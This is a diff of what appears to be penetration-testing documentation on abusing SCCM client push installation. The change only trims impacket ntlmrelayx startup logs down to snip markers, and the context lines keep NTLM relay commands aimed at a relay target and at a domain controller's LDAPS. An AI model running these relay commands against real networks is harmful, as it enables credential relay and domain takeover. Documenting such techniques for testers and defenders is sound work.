@@ -69,22 +69,9 @@ It is not possible to identify whether automatic site-wide client push installat
     # impacket-ntlmrelayx -smb2support -ts -ip <NTLMRELAYX_LISTENER_IP> -t <RELAY_TARGET_IP>
     Impacket v0.11.0 - Copyright 2023 Fortra
 
-    [2024-02-26 15:49:48] [*] Protocol Client MSSQL loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client LDAPS loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client LDAP loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client RPC loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client HTTPS loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client HTTP loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client IMAPS loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client IMAP loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client SMTP loaded..
+    <...SNIP...>
     [2024-02-26 15:49:48] [*] Protocol Client SMB loaded..
-    [2024-02-26 15:49:48] [*] Protocol Client DCSYNC loaded..
-    [2024-02-26 15:49:50] [*] Running in relay mode to single host
-    [2024-02-26 15:49:50] [*] Setting up SMB Server
-    [2024-02-26 15:49:50] [*] Setting up HTTP Server on port 80
-    [2024-02-26 15:49:50] [*] Setting up WCF Server
-    [2024-02-26 15:49:50] [*] Setting up RAW Server on port 6666
+    <...SNIP...>
 
     [2024-02-26 15:49:50] [*] Servers started, waiting for connections
     ```
@@ -132,26 +119,10 @@ It is not possible to identify whether automatic site-wide client push installat
     # ntlmrelayx.py -t ldaps://<DOMAIN_CONTROLLER_IP> -smb2support -ts --no-smb-server -i    
     Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
     
-    [2026-02-06 18:11:47] [*] Protocol Client SMB loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client SMTP loaded..
+    <...SNIP...>
     [2026-02-06 18:11:47] [*] Protocol Client HTTPS loaded..
     [2026-02-06 18:11:47] [*] Protocol Client HTTP loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client WINRMS loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client IMAP loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client IMAPS loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client DCSYNC loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client RPC loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client MSSQL loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client LDAPS loaded..
-    [2026-02-06 18:11:47] [*] Protocol Client LDAP loaded..
-    [2026-02-06 18:11:47] [*] Running in relay mode to single host
-    [2026-02-06 18:11:47] [*] Setting up HTTP Server on port 80
-    [2026-02-06 18:11:47] [*] Setting up WCF Server on port 9389
-    [2026-02-06 18:11:47] [*] Setting up RAW Server on port 6666
-    [2026-02-06 18:11:47] [*] Setting up WinRM (HTTP) Server on port 5985
-    [2026-02-06 18:11:47] [*] Setting up WinRMS (HTTPS) Server on port 5986
-    [2026-02-06 18:11:47] [*] Setting up RPC Server on port 135
-    [2026-02-06 18:11:47] [*] Multirelay disabled
+    <...SNIP...>
     
     [2026-02-06 18:11:47] [*] Servers started, waiting for connections
 
